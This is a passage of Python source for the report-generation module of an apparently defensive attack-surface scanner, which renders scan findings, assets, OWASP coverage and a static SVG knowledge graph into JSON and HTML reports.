"""
Report generation (Core role owns this file; it renders everyone else's data).

Entry point, called by `marsadix report <target>`:

    generate_report(conn, target, fmt="both", out_dir="output", scan_id=None) -> int

Two outputs, same underlying data, zero external dependencies (stdlib only,
matching pyproject.toml's dependencies = []):

    JSON -> machine-readable snapshot of one scan (C10). For CI, exports,
            or feeding another tool.
    HTML -> one self-contained file, no network calls needed to view it
            (C11, C18, C19). Three layers in one page:
              1. Overview  - headline cards, a posture score, OWASP coverage
                             %, what changed since the previous scan
              2. Details   - findings table and assets table. A
                             Triage/Engagement toggle (top right) switches
                             between a quick-scan view and the full
                             evidence/attribution view for every finding
              3. Appendix  - methodology + the Detection Limitations
                             disclosure (C23): "No Indicators" is never
                             presented as "Not Vulnerable" (A10)

This module only READS and RENDERS. It does not compute risk. The
_preliminary_posture_score() below is a transparent, documented placeholder
(severity-weighted finding count) until Person 4 wires in the real
context-aware Risk Scoring / Attack Surface Score (M15 / M17) -- see the
docstring on that function for the exact extension point.

More formats (C20) live in reports/export.py: CSV, SARIF 2.1.0 and a text PDF
(`marsadix report --format csv|sarif|pdf|all`). The HTML page also keeps its
client-side "Export CSV" button.
"""

from __future__ import annotations

import html
import json
import logging
import math
import random
import sys
from pathlib import Path
from typing import Optional

from .. import db
from ..core.diff import compute_diff
from ..core.textfile import safe_filename as _safe_filename_component
from ..models import utcnow
from ..owasp import ALL_CATEGORIES
from ..skills import registry as skills_registry
from . import export

log = logging.getLogger(__name__)

_SEVERITY_ORDER = ["critical", "high", "medium", "low", "info"]
_SEVERITY_WEIGHT = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
_STATUS_LABEL = {
    "detected": "Detected",
    "needs_review": "Needs Review",
    "no_indicators": "No Indicators",
}


# --------------------------------------------------------------------------
# data gathering (reads only)
# --------------------------------------------------------------------------

def _previous_completed_scan(conn, target: str, exclude_scan_id: int) -> Optional[dict]:
    row = conn.execute(
        # Strictly older than the report's scan. `id <> ?` allowed a newer
        # scan to be selected, so "previous" trend data could run backwards.
        "SELECT * FROM scans WHERE target=? AND id<? AND status='completed' "
        "ORDER BY started_at DESC, id DESC LIMIT 1",
        (target, exclude_scan_id)).fetchone()
    return dict(row) if row else None


def _preliminary_posture_score(findings: list[dict]) -> int:
    """
    0-100, higher = healthier. A transparent placeholder: counts findings
    weighted by severity and decays a perfect score.

    EXTENSION POINT for Person 4 (M15/M17): once the real context-aware Risk
    Scoring exists (CVSS + EPSS + KEV + exposure + asset criticality), swap
    the body of this function for a call into that module. Nothing else in
    this file needs to change -- every caller just reads the returned int.
    """
    if not findings:
        return 100
    weighted = sum(_SEVERITY_WEIGHT.get(f.get("severity"), 0) for f in findings)
    return max(0, 100 - weighted * 4)


def _read_scope_entries(path: Optional[str], limit: int = 40) -> list:
    """The authorized-scope lines (comments stripped), so the report states what was in scope."""
    if not path:
        return []
    try:
        lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        return []
    return [ln.strip() for ln in lines if ln.strip() and not ln.strip().startswith("#")][:limit]


def _read_tool_runs(target: str, scan_id: int, out_dir: Optional[str]) -> list:
    """Per-tool outcome written by the pipeline (core/toolstatus), if it is next to the report."""
    for d in filter(None, (out_dir, "output")):
        p = Path(d) / f"{_safe_filename_component(target)}_scan{scan_id}_tools.json"
        try:
            return json.loads(p.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
    return []


def _gather(conn, target: str, scan_id: Optional[int], out_dir: Optional[str] = None) -> Optional[dict]:
    if scan_id is None:
        # The report describes the latest COMPLETED scan: a failed/interrupted one is
        # partial data. Only if nothing ever completed do we fall back to the newest.
        latest = (db.get_latest_scans(conn, target, limit=1, completed_only=True)
                  or db.get_latest_scans(conn, target, limit=1))
        if not latest:
            return None
        scan_id = latest[0]["id"]

    scan_row = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
    if scan_row is None or str(scan_row["target"]).lower() != target.lower():
        # an id from another target would build a report titled `target` out of someone else's data
        return None

    findings = export.prioritize(dict(r) for r in db.get_findings(conn, scan_id))
    assets = [dict(r) for r in db.get_assets(conn, scan_id)]

    prev = _previous_completed_scan(conn, target, scan_id)
    diff = compute_diff(conn, prev["id"], scan_id) if prev else None

    scan_d = dict(scan_row)
    active = {sk.name for sk in skills_registry.active_skills(
        scan_d.get("mode") or "passive", allow_injection=True)}
    skills = [{"name": sk.name, "title": sk.title, "engine": sk.engine,
               "owasp_category": sk.owasp_category, "source_reference": sk.source_reference,
               "state": "active" if sk.name in active else
                        ("planned" if not skills_registry.is_implemented(sk.name) else "off")}
              for sk in skills_registry.all_skills()]

    return {
        "target": target,
        "scan": scan_d,
        "scope_entries": _read_scope_entries(scan_d.get("scope_file")),
        "tool_runs": _read_tool_runs(target, scan_id, out_dir),
        "detection_skills": skills,
        "assets": assets,
        "services": [dict(r) for r in db.get_services(conn, scan_id)],
        "technologies": [dict(r) for r in db.get_technologies(conn, scan_id)],
        "web_items": [dict(r) for r in db.get_web_items(conn, scan_id)],
        "findings": findings,
        "owasp_coverage": db.get_owasp_coverage(conn, scan_id),
        "source_coverage": db.get_source_coverage(conn, scan_id),
        "graph": db.get_graph(conn, scan_id),  # written by the "graph" pipeline
                                                 # stage (core/graph.py); this
                                                 # module only reads it (G5)
        "posture_score": _preliminary_posture_score(findings),
        "previous_scan_id": prev["id"] if prev else None,
        "diff": diff.to_dict() if diff else None,
        "generated_at": utcnow(),
    }


# --------------------------------------------------------------------------
# JSON output (C10)
# --------------------------------------------------------------------------

def _write_json(data: dict, out_dir: Path, target: str, scan_id: int) -> Path:
    path = out_dir / f"{_safe_filename_component(target)}_scan{scan_id}_report.json"
    path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
    return path


# --------------------------------------------------------------------------
# Knowledge Graph visualization (G5)
#
# Deliberately NOT using a JS library (Cytoscape.js/D3.js): the layout is
# computed once, in Python, at report-generation time, and emitted as plain
# static SVG. This keeps the report a single offline-viewable file with zero
# external script tags, consistent with the rest of this module, and means
# there is no client-side physics/rendering code to get wrong -- what you
# see is exactly what Python computed, nothing executes in the browser.
# --------------------------------------------------------------------------

# Each node type maps to a CSS custom property (defined in _CSS, with its
# own light/dark value) instead of a hardcoded hex -- so the graph itself
# switches palette with the rest of the report instead of staying a fixed
# light-mode color scheme inside a dark page.
_NODE_VARS = {
    "subdomain": "--n-subdomain", "ip": "--n-ip", "asn": "--n-asn",
    "cdn": "--n-cdn", "port": "--n-port", "service": "--n-service",
    "cpe": "--n-cpe", "technology": "--n-tech", "cve": "--n-cve",
    "finding": "--n-finding", "email": "--n-ip", "js_file": "--n-asn",
    "endpoint": "--n-service", "certificate": "--n-cdn", "org": "--n-subdomain",
}

# Edges are colour-coded by what KIND of relationship they tell: a plain
# infrastructure link reads differently from "this is what's vulnerable".
_EDGE_GROUP = {
    "resolves_to": "struct", "belongs_to": "struct", "behind": "struct",
    "exposes": "struct", "runs": "struct", "has_cpe": "struct", "uses": "struct",
    "affected_by": "risk", "listed_in": "risk", "found_on": "risk",
}


# The report is a static SVG, so a graph with thousands of nodes is unreadable
# anyway. Past this many nodes only the most informative ones are drawn
# (findings and CVEs first, then the best-connected nodes) and the page says
# how many were left out. The full graph is still in the JSON report and in
# `marsadix graph`.
MAX_GRAPH_NODES = 400

# The layout canvas grows with the number of nodes: 3 nodes laid out on a
# 960x620 board were thrown to its corners, hundreds of pixels apart. From about
# 15 nodes up the canvas is the full 960x620 (so big graphs are laid out exactly
# as before); below that it shrinks, keeping a roughly constant space per node.
CANVAS_MAX = (960, 620)
CANVAS_MIN = (520, 330)
AREA_PER_NODE = 40000       # px^2 of layout canvas per node

# Label geometry, used to size the SVG so no label is cut off at its edge.
LABEL_CHAR_PX = 5.9         # approx. width of one character of the 9.5px bold label
GRAPH_PAD = 24
GRAPH_MIN_W, GRAPH_MIN_H = 640, 340   # a tiny graph is not blown up to fill the page


def _select_visible(nodes: list[dict], edges: list[dict],
                     limit: int = MAX_GRAPH_NODES) -> tuple[list[dict], list[dict], int]:
    """Returns (nodes_to_draw, edges_between_them, number_of_nodes_left_out)."""
    if len(nodes) <= limit:
        return nodes, edges, 0
    degree: dict[str, int] = {n["id"]: 0 for n in nodes}
    for e in edges:
        if e["src_id"] in degree:
            degree[e["src_id"]] += 1
        if e["dst_id"] in degree:
            degree[e["dst_id"]] += 1
    ranked = sorted(nodes, key=lambda n: (
        0 if n["node_type"] in ("finding", "cve") else 1, -degree[n["id"]], n["id"]))
    keep = ranked[:limit]
    keep_ids = {n["id"] for n in keep}
    kept_edges = [e for e in edges if e["src_id"] in keep_ids and e["dst_id"] in keep_ids]
    return keep, kept_edges, len(nodes) - limit


def _canvas_size(n_nodes: int) -> tuple[int, int]:
    area = min(n_nodes * AREA_PER_NODE, CANVAS_MAX[0] * CANVAS_MAX[1])
    h = math.sqrt(area / 1.55)
    return (max(CANVAS_MIN[0], min(CANVAS_MAX[0], round(1.55 * h))),
            max(CANVAS_MIN[1], min(CANVAS_MAX[1], round(h))))


def _force_layout(nodes: list[dict], edges: list[dict],
                   width: int = 960, height: int = 620,
                   iterations: Optional[int] = None) -> dict:
    """
    Force-directed layout (Fruchterman-Reingold style), pure Python, no
    dependency. Nodes repel each other; edges act like springs pulling
    connected nodes together. Deterministic (seeded) so re-generating the
    report for the same scan draws the same picture.

    Repulsion used to be computed between EVERY pair of nodes, 400 times:
    O(n^2 * 400), which took ~25 s for 480 nodes and minutes for a real
    target. Repulsion falls off with distance, so it is now only computed
    between nodes in the same or neighbouring cell of a grid whose cell is
    2*k wide (k = the ideal edge length). Cost is now roughly linear in the
    number of nodes. The picture is NOT pixel-identical to the all-pairs
    version for mid-sized graphs (distant repulsion is dropped), but it is
    just as well spread: measured on 120 nodes the all-pairs layout left some
    nodes stacked on top of each other, this one keeps >= ~11px between them.
    """
    if not nodes:
        return {}
    n = len(nodes)
    if iterations is None:
        iterations = 400 if n <= 150 else 200
    # Deterministic layout, not security-sensitive.
    rng = random.Random(42)  # nosec B311
    pos = {nd["id"]: [rng.uniform(0, width), rng.uniform(0, height)] for nd in nodes}
    valid_ids = set(pos)
    k = math.sqrt((width * height) / max(n, 1))
    cell = 2 * k

    safe_edges = [e for e in edges if e["src_id"] in valid_ids and e["dst_id"] in valid_ids]

    for it in range(iterations):
        disp = {nid: [0.0, 0.0] for nid in pos}

        grid: dict[tuple[int, int], list[str]] = {}
        for nid, (x, y) in pos.items():
            grid.setdefault((int(x // cell), int(y // cell)), []).append(nid)

        for (cx, cy), members in grid.items():
            for ox in (-1, 0, 1):
                for oy in (-1, 0, 1):
                    others = grid.get((cx + ox, cy + oy))
                    if not others:
                        continue
                    for a in members:
                        ax, ay = pos[a]
                        for b in others:
                            if a >= b:          # visit each unordered pair once
                                continue
                            dx, dy = ax - pos[b][0], ay - pos[b][1]
                            dist = math.hypot(dx, dy) or 0.01
                            force = (k * k) / dist
                            ux, uy = dx / dist, dy / dist
                            disp[a][0] += ux * force; disp[a][1] += uy * force
                            disp[b][0] -= ux * force; disp[b][1] -= uy * force

        for e in safe_edges:
            a, b = e["src_id"], e["dst_id"]
            dx, dy = pos[a][0] - pos[b][0], pos[a][1] - pos[b][1]
            dist = math.hypot(dx, dy) or 0.01
            force = (dist * dist) / k
            ux, uy = dx / dist, dy / dist
            disp[a][0] -= ux * force; disp[a][1] -= uy * force
            disp[b][0] += ux * force; disp[b][1] += uy * force
        # cooling: large steps early to spread out fast, tiny steps late to settle
        temp = max(1.0, 14 * (1 - it / iterations))
        for nid in pos:
            dx, dy = disp[nid]
            dist = math.hypot(dx, dy) or 0.01
            cap = min(dist, temp)
            pos[nid][0] = min(width - 40, max(40, pos[nid][0] + (dx / dist) * cap))
            pos[nid][1] = min(height - 40, max(40, pos[nid][1] + (dy / dist) * cap))
    return pos


def _layout_graph(nodes: list[dict], edges: list[dict],
                   width: int = 960, height: int = 620,
                   iterations: Optional[int] = None,
                   isolated_cell: tuple[int, int] = (170, 44)) -> dict:
    """
    Positions for every node: {node_id: [x, y]}.

    Nodes that have at least one edge go through the force layout. Nodes with
    NO edges (typically subdomains that never resolved to an IP) have nothing
    to hold them in place, so a force layout only pushes them to the corners
    of the canvas. They are instead laid out on a tidy grid, centred under the
    linked part of the graph (or in the middle when nothing is linked).
    `isolated_cell` is the grid cell (width, height): wide enough for a label
    when the isolated nodes are labelled, small when they are plain dots.
    """
    if not nodes:
        return {}
    ids = {nd["id"] for nd in nodes}
    safe_edges = [e for e in edges if e["src_id"] in ids and e["dst_id"] in ids]
    linked_ids = {e["src_id"] for e in safe_edges} | {e["dst_id"] for e in safe_edges}
    linked = [nd for nd in nodes if nd["id"] in linked_ids]
    isolated = sorted((nd for nd in nodes if nd["id"] not in linked_ids),
                      key=lambda nd: (nd["node_type"], nd["label"], nd["id"]))

    pos = _force_layout(linked, safe_edges, width, height, iterations) if linked else {}
    if not isolated:
        return pos

    cell_w, cell_h = isolated_cell
    cols = max(1, min(len(isolated), max(3, int((width - 80) // cell_w))))   # never narrower than 3 per row
    rows = math.ceil(len(isolated) / cols)
    if pos:
        xs = [p[0] for p in pos.values()]
        centre_x = (min(xs) + max(xs)) / 2
        top = max(p[1] for p in pos.values()) + 70       # clear gap below the linked part
    else:
        centre_x = width / 2
        top = (height - (rows - 1) * cell_h) / 2
    left = centre_x - (cols - 1) * cell_w / 2
    for i, nd in enumerate(isolated):
        pos[nd["id"]] = [left + (i % cols) * cell_w, top + (i // cols) * cell_h]
    return pos


def _render_graph_svg(graph: dict) -> str:
    nodes, edges = graph.get("nodes", []), graph.get("edges", [])
    if not nodes:
        return '<p class="muted">No graph data for this scan (recon/web/asm haven\'t run yet).</p>'

    total_nodes = len(nodes)
    nodes, edges, hidden = _select_visible(nodes, edges)
    truncated_note = (
        f'<p class="muted">Showing the {len(nodes)} most relevant of {total_nodes} nodes '
        f'(findings, CVEs and best-connected nodes first). The full graph is in the JSON '
        f'report and in <code>marsadix graph</code>.</p>') if hidden else ""

    degree: dict[str, int] = {n["id"]: 0 for n in nodes}
    for e in edges:
        if e["src_id"] in degree:
            degree[e["src_id"]] += 1
        if e["dst_id"] in degree:
            degree[e["dst_id"]] += 1

    # Important nodes get a visible label; a sea of 50 isolated subdomains
    # with no relationships doesn't need 50 overlapping text labels to be
    # readable -- hovering any dot still shows its name via <title>.
    always_label = {"cve", "finding", "asn", "cdn"}
    show_label_for = {
        n["id"] for n in nodes
        if degree[n["id"]] > 0 or n["node_type"] in always_label or len(nodes) <= 15
    }

    isolated = [n for n in nodes if degree[n["id"]] == 0]
    width, height = _canvas_size(len(nodes) - len(isolated))
    cell = (170, 44) if any(n["id"] in show_label_for for n in isolated) else (34, 34)
    pos = _layout_graph(nodes, edges, width, height, isolated_cell=cell)

    lines = []
    for e in edges:
        if e["src_id"] not in pos or e["dst_id"] not in pos:
            continue
        x1, y1 = pos[e["src_id"]]
        x2, y2 = pos[e["dst_id"]]
        group = _EDGE_GROUP.get(e["relation"], "struct")
        lines.append(
            f'<line x1="{x1:.0f}" y1="{y1:.0f}" x2="{x2:.0f}" y2="{y2:.0f}" '
            f'class="graph-edge edge-{group}"><title>{_e(e["relation"])}</title></line>')

    circles = []
    # Bounding box of everything that is drawn, labels included. The labels sit
    # to the right of their dot, so a node near the right border used to have
    # its name sliced off by the SVG edge.
    min_x = min_y = float("inf")
    max_x = max_y = float("-inf")
    for n in nodes:
        if n["id"] not in pos:
            continue
        x, y = pos[n["id"]]
        var = _NODE_VARS.get(n["node_type"], "--n-ip")
        r = 6 + min(degree[n["id"]], 8) * 1.4   # busier nodes draw the eye first
        label_svg = ""
        label_w = 0.0
        if n["id"] in show_label_for:
            label = n["label"][:24] + ("…" if len(n["label"]) > 24 else "")
            label_svg = f'<text x="{r + 4:.0f}" y="4" class="graph-label">{_e(label)}</text>'
            label_w = 4 + len(label) * LABEL_CHAR_PX + 4        # gap + text + stroke halo
        min_x, max_x = min(min_x, x - r), max(max_x, x + r + label_w)
        min_y, max_y = min(min_y, y - max(r, 8)), max(max_y, y + max(r, 8))
        circles.append(f'''
        <g class="graph-node" transform="translate({x:.0f},{y:.0f})">
          <circle r="{r:.0f}" fill="var({var})" class="node-dot">
            <title>{_e(n["node_type"])}: {_e(n["label"])} ({degree[n["id"]]} link{"s" if degree[n["id"]] != 1 else ""})</title>
          </circle>
          {label_svg}
        </g>''')

    # viewBox = the content plus padding, never smaller than a minimum size,
    # with the content centred. A 3-node graph is no longer drawn on a huge
    # empty 960x620 board, and nothing can fall outside the visible area.
    content_w, content_h = max_x - min_x, max_y - min_y
    vb_w = max(content_w + 2 * GRAPH_PAD, GRAPH_MIN_W)
    vb_h = max(content_h + 2 * GRAPH_PAD, GRAPH_MIN_H)
    vb_x = min_x - (vb_w - content_w) / 2
    vb_y = min_y - (vb_h - content_h) / 2

    legend = "".join(
        f'<span class="legend-item"><i style="background:var({_NODE_VARS.get(t, "--n-ip")})"></i>{_e(t)}</span>'
        for t in sorted({n["node_type"] for n in nodes}))

    return f'''
    {truncated_note}
    <div class="legend">{legend}</div>
    <svg viewBox="{vb_x:.0f} {vb_y:.0f} {vb_w:.0f} {vb_h:.0f}" class="graph-svg">
      <defs>
        <radialGradient id="graphBg" cx="50%" cy="35%" r="75%">
          <stop offset="0%" stop-color="var(--graph-bg-near)"/>
          <stop offset="100%" stop-color="var(--graph-bg-far)"/>
        </radialGradient>
      </defs>
      <rect x="{vb_x:.0f}" y="{vb_y:.0f}" width="{vb_w:.0f}" height="{vb_h:.0f}" fill="url(#graphBg)" rx="10"/>
      {"".join(lines)}
      {"".join(circles)}
    </svg>'''


# --------------------------------------------------------------------------
# HTML output (C11, C18, C19, C23)
# --------------------------------------------------------------------------

def _e(value) -> str:
    """HTML-escape anything that might end up in the page."""
    return html.escape("" if value is None else str(value))


def _remediation_for(finding: dict) -> str:
    """
    Remediation text for one finding. The remediation database (M19) is owned by
    the CVE-monitor/risk role; when `marsadix/remediation.py` provides
    get_remediation(finding) -> str | None this shows it, until then a clear placeholder.
    """
    try:
        from .. import remediation                      # type: ignore[attr-defined]
        text = remediation.get_remediation(finding)
    except Exception:                                   # module absent or broken: never break the report
        text = None
    return text or "Not available yet (remediation database pending)"


def _exec_summary_section(data: dict) -> str:
    top = export.prioritize(data["findings"])[:5]
    items = "".join(
        f"<li><span class=\"badge sev-{_e(f.get('severity'))}\">{_e(f.get('severity'))}</span> "
        f"{_e(f.get('title'))} &mdash; {_e(f.get('host'))} "
        f"({_e(_STATUS_LABEL.get(str(f.get('status')), f.get('status')))})</li>" for f in top)
    paras = "".join(f"<p>{_e(line)}</p>" for line in export.summary_lines(data))
    return f"""<section>
    <h2>Executive summary</h2>
    {paras}
    {('<h3>Top priorities</h3><ol class="top">' + items + '</ol>') if items else '<p>No findings in this scan.</p>'}
  </section>"""


def _scope_methodology_section(data: dict) -> str:
    scan = data["scan"]
    scope = data.get("scope_entries") or []
    scope_html = ("<pre class=\"scope\">" + _e("\n".join(scope)) + "</pre>") if scope else \
        f"<p>Default scope: <code>{_e(data['target'])}</code> and its subdomains" + \
        (f" (scope file: <code>{_e(scan.get('scope_file'))}</code>)" if scan.get("scope_file") else "") + ".</p>"
    runs = data.get("tool_runs") or []
    bad = [r for r in runs if r.get("status") in ("failed", "timeout", "truncated")]
    if not runs:
        tools_html = "<p>No per-tool status was recorded for this scan.</p>"
    else:
        tools_html = ("<p>" + (f"<strong>{len(bad)} tool run(s) were incomplete</strong>: results from them may be missing. "
                               if bad else "All recorded tool runs completed. ") + "</p>"
                      "<table><thead><tr><th>Tool / source</th><th>Status</th><th>Detail</th></tr></thead><tbody>" +
                      "".join(f"<tr><td>{_e(r.get('tool'))}</td><td>{_e(r.get('status'))}</td><td>{_e(r.get('detail'))}</td></tr>"
                              for r in runs) + "</tbody></table>")
    skills = data.get("detection_skills") or []
    active = [k for k in skills if k["state"] == "active"]
    planned = [k for k in skills if k["state"] == "planned"]
    skills_html = ("<table><thead><tr><th>Skill</th><th>Engine</th><th>OWASP</th><th>Methodology</th></tr></thead><tbody>" +
                   "".join(f"<tr><td>{_e(k['name'])}</td><td>{_e(k['engine'])}</td><td>{_e(k['owasp_category'] or '-')}</td>"
                           f"<td>{_e(k['source_reference'])}</td></tr>" for k in active) + "</tbody></table>") if active else \
        "<p>No detection skills were active in this scan (the detection stage is not implemented yet).</p>"
    if planned:
        skills_html += f"<p class=\"muted\">Planned, not yet available: {_e(', '.join(k['name'] for k in planned))}.</p>"
    return f"""<section>
    <h2>Scope &amp; methodology</h2>
    <h3>Scope</h3>{scope_html}
    <h3>Scan parameters</h3>
    <p>Mode <code>{_e(scan.get('mode', 'passive'))}</code> &middot; recursion depth {_e(scan.get('max_depth'))} &middot;
       rate limit {_e(scan.get('rate_limit') or 'default')} &middot; {'baseline scan' if scan.get('is_baseline') else 'tracked scan'}.</p>
    <h3>Detection skills</h3>{skills_html}
    <h3>Tools and data sources</h3>{tools_html}
  </section>"""


def _findings_rows(findings: list[dict]) -> str:
    rows = []
    order = {s: i for i, s in enumerate(_SEVERITY_ORDER)}   # (rows arrive already prioritized; kept for callers that pass raw lists)
    for f in export.prioritize(findings):
        status = f.get("status", "no_indicators")
        rows.append(f"""
        <tr class="sev-{_e(f.get('severity'))}">
          <td>{_e(f.get('host'))}</td>
          <td>{_e(f.get('title'))}</td>
          <td><span class="badge sev-{_e(f.get('severity'))}">{_e(f.get('severity'))}</span></td>
          <td><span class="badge status-{_e(status)}">{_e(_STATUS_LABEL.get(status, status))}</span></td>
          <td>{_e(f.get('owasp_category') or '-')}</td>
          <td>{_e(f.get('confidence'))}</td>
          <td class="engagement-only">{_e(f.get('evidence') or '-')}</td>
          <td class="engagement-only">{_e(f.get('source_reference') or '-')}</td>
          <td class="engagement-only">{_e(_remediation_for(f))}</td>
          <td class="engagement-only">{_e(f.get('url') or '-')}</td>
          <td class="engagement-only"><span class="badge exploited-false">Detected — Not Exploited</span></td>
        </tr>""")
    return "".join(rows) if rows else '<tr><td colspan="10">No findings recorded for this scan.</td></tr>'


def _assets_rows(assets: list[dict]) -> str:
    rows = []
    for a in assets:
        rows.append(f"""
        <tr>
          <td>{_e(a.get('host'))}</td>
          <td>{_e(a.get('ip') or '-')}</td>
          <td>{'yes' if a.get('in_scope') else 'no'}</td>
          <td>{_e(a.get('confidence_score', 0))}</td>
          <td>{_e(a.get('asn') or '-')}</td>
          <td>{'yes (' + _e(a.get('cdn_name')) + ')' if a.get('is_cdn') else 'no'}</td>
        </tr>""")
    return "".join(rows) if rows else '<tr><td colspan="6">No assets recorded for this scan.</td></tr>'


def _owasp_rows(coverage: dict) -> str:
    breakdown = coverage.get("breakdown", {})
    rows = []
    for cat in ALL_CATEGORIES:
        n = breakdown.get(cat, 0)
        cls = "owasp-covered" if n else "owasp-uncovered"
        rows.append(f"""
        <tr class="{cls}">
          <td>{_e(cat)}</td>
          <td>{n}</td>
          <td>{'tested' if n else 'no findings yet'}</td>
        </tr>""")
    return "".join(rows)


def _diff_section(diff: Optional[dict], prev_id: Optional[int], scan_id: int) -> str:
    if diff is None:
        return '<p class="muted">This is the first scan of this target — no previous scan to compare against.</p>'

    def _list(title: str, items: list[str]) -> str:
        if not items:
            return f"<p><strong>{_e(title)}:</strong> none</p>"
        lis = "".join(f"<li>{_e(i)}</li>" for i in items[:30])
        more = f"<li><em>...and {len(items) - 30} more</em></li>" if len(items) > 30 else ""
        return f"<p><strong>{_e(title)}:</strong></p><ul>{lis}{more}</ul>"

    return f"""
      <p class="muted">Compared against scan #{prev_id} (previous) → scan #{scan_id} (this report).</p>
      {_list("New assets", diff["new_assets"])}
      {_list("Removed assets", diff["removed_assets"])}
      {_list("New open ports", diff["new_ports"])}
      {_list("Closed ports", diff["closed_ports"])}
      {_list("Changed technologies", diff["changed_technologies"])}
      {_list("New findings", diff["new_findings"])}
      {_list("Resolved findings", diff["resolved_findings"])}
    """


_CSS = """
:root {
  --bg:#f7f8fa; --surface:#ffffff; --text:#1b1f24; --muted:#5b6472;
  --border:#e2e5ea; --accent:#2457d9;
  --crit:#b3261e; --high:#c75b12; --med:#a67c00; --low:#2f7a3d; --info:#5b6472;
  /* Knowledge Graph palette (light) */
  --n-subdomain:#2457d9; --n-ip:#5b6472; --n-asn:#a6790a; --n-cdn:#7c5cd1;
  --n-service:#2f7a3d; --n-cpe:#8a93a3; --n-tech:#0e7490; --n-cve:#c23a32;
  --n-finding:#d9731a; --n-port:#5b6472;
  --graph-bg-near:#eef1f8; --graph-bg-far:#f7f8fa;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg:#13161b; --surface:#1b1f26; --text:#e8eaed; --muted:#9aa4b2; --border:#2b313b;
    --n-subdomain:#6d93ff; --n-ip:#9aa4b2; --n-asn:#e3b341; --n-cdn:#b794f6;
    --n-service:#5fd97a; --n-cpe:#9aa4b2; --n-tech:#4dd0e1; --n-cve:#ff6b61;
    --n-finding:#ffa552; --n-port:#9aa4b2;
    --graph-bg-near:#242a35; --graph-bg-far:#161a21;
  }
}
:root[data-theme="dark"] {
  --bg:#13161b; --surface:#1b1f26; --text:#e8eaed; --muted:#9aa4b2; --border:#2b313b;
  --n-subdomain:#6d93ff; --n-ip:#9aa4b2; --n-asn:#e3b341; --n-cdn:#b794f6;
  --n-service:#5fd97a; --n-cpe:#9aa4b2; --n-tech:#4dd0e1; --n-cve:#ff6b61;
  --n-finding:#ffa552; --n-port:#9aa4b2;
  --graph-bg-near:#242a35; --graph-bg-far:#161a21;
}
* { box-sizing: border-box; }
body { margin:0; background:var(--bg); color:var(--text);
       font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; line-height:1.5; }
header { padding:24px 32px; border-bottom:1px solid var(--border); }
header h1 { margin:0 0 4px; font-size:22px; }
header p { margin:0; color:var(--muted); font-size:14px; }
main { max-width:1100px; margin:0 auto; padding:24px 32px 64px; }
.toolbar { display:flex; gap:8px; margin-bottom:24px; flex-wrap:wrap; }
button { background:var(--surface); color:var(--text); border:1px solid var(--border);
         border-radius:8px; padding:8px 14px; font-size:13px; cursor:pointer; }
button.active { background:var(--accent); color:#fff; border-color:var(--accent); }
.cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:12px; margin-bottom:28px; }
.card { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:16px; }
.card .num { font-size:28px; font-weight:700; }
.card .label { color:var(--muted); font-size:12px; text-transform:uppercase; letter-spacing:.04em; }
section { margin-bottom:36px; }
h2 { font-size:16px; border-bottom:1px solid var(--border); padding-bottom:8px; }
table { width:100%; border-collapse:collapse; font-size:13px; background:var(--surface);
        border:1px solid var(--border); border-radius:10px; overflow:hidden; }
th, td { text-align:left; padding:8px 10px; border-bottom:1px solid var(--border); }
th { color:var(--muted); font-weight:600; font-size:11px; text-transform:uppercase; }
.badge { display:inline-block; padding:2px 8px; border-radius:999px; font-size:11px; font-weight:600; }
.sev-critical, .badge.sev-critical { color:#fff; background:var(--crit); }
.sev-high, .badge.sev-high { color:#fff; background:var(--high); }
.sev-medium, .badge.sev-medium { color:#fff; background:var(--med); }
.sev-low, .badge.sev-low { color:#fff; background:var(--low); }
.sev-info, .badge.sev-info { color:#fff; background:var(--info); }
.badge.status-detected { background:var(--crit); color:#fff; }
.badge.status-needs_review { background:var(--med); color:#fff; }
.badge.status-no_indicators { background:var(--border); color:var(--muted); }
.badge.exploited-false { background:transparent; border:1px solid var(--low); color:var(--low); }
.owasp-covered td:first-child { font-weight:600; }
.owasp-uncovered { color:var(--muted); }
.engagement-only { display:none; }
.muted { color:var(--muted); }
section h3 { font-size:.82rem; text-transform:uppercase; letter-spacing:.04em; color:var(--muted); font-weight:600; margin:18px 0 6px; }
pre.scope { background:var(--surface); border:1px solid var(--border); padding:8px 12px; border-radius:6px; overflow:auto; }
ol.top li { margin:4px 0; }
@media print { .toolbar { display:none; } body { background:#fff; color:#000; } section { break-inside:avoid-page; } }
body.engagement .engagement-only { display:table-cell; }
.muted { color:var(--muted); }
.limitations { background:var(--surface); border:1px solid var(--border);
               border-left:4px solid var(--med); border-radius:10px; padding:16px; }
.graph-svg { width:100%; height:auto; border:1px solid var(--border); border-radius:10px; }
.graph-edge { stroke:var(--muted); stroke-width:1.3; opacity:.6; }   /* was var(--border): ~1.1:1 contrast, i.e. invisible */
.graph-edge.edge-risk { stroke:var(--crit); stroke-width:1.6; opacity:.7; }
.graph-node .node-dot { stroke:var(--surface); stroke-width:2; cursor:default;
                         transition:r .15s ease; }
.graph-node:hover .node-dot { stroke:var(--accent); }
.graph-label { font-size:9.5px; font-weight:600; fill:var(--text); pointer-events:none;
               paint-order:stroke; stroke:var(--surface); stroke-width:3px; }
.legend { display:flex; flex-wrap:wrap; gap:12px; margin-bottom:10px; font-size:12px; color:var(--muted); }
.legend-item { display:flex; align-items:center; gap:5px; }
.legend-item i { width:9px; height:9px; border-radius:50%; display:inline-block; }
"""

def _why_no_ports(data: dict) -> str:
    """An empty table is not an answer. Say WHY there is nothing, from the scan's own data."""
    mode = (data.get("scan") or {}).get("mode") or "passive"
    assets = data.get("assets") or []
    cdn = [a for a in assets if a.get("is_cdn")]
    reasons = []
    if mode == "passive":
        reasons.append("the scan ran in passive mode, which never sends traffic to the target (use --mode standard or full)")
    if cdn:
        reasons.append(f"{len(cdn)} of {len(assets)} host(s) are behind a CDN/WAF, and those are deliberately not port-scanned "
                       "(the open ports belong to the CDN, not to the target)")
    out_scope = [a for a in assets if not a.get("in_scope")]
    if out_scope:
        reasons.append(f"{len(out_scope)} host(s) are out of scope and were not scanned")
    reasons.append("no open port was found on the remaining hosts, or naabu / nmap were not available "
                   "(see the tool status table under Scope &amp; methodology)")
